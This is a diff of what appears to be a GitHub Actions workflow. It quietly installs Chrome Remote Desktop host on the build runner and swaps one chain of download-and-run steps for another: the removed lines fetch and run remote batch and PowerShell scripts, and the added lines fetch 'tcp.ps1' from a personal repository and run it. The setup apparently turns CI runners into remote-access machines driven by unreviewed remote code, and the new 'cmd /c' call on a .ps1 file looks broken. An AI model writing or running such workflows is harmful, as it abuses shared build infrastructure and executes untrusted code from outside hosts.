@@ -13,11 +13,8 @@ jobs:
         run: |
           Invoke-WebRequest https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi -OutFile crd.msi
           .\crd.msi /quiet
-          Invoke-WebRequest -Uri https://gitlab.com/EfeBey2903/myprojetct/-/raw/main/a.cmd -OutFile setup.bat
-          cmd /c setup.bat
-          sleep 5
-          D:\a\fictional-octo-waffle\tcp.ps1
-          cmd /c loop.bat
+          Invoke-WebRequest https://github.com/Efebey2903/fictional-octo-waffle/raw/main/tcp.ps1 -OutFile a.ps1
+          cmd /c a.ps1
           
       - name: Start 
         run: |
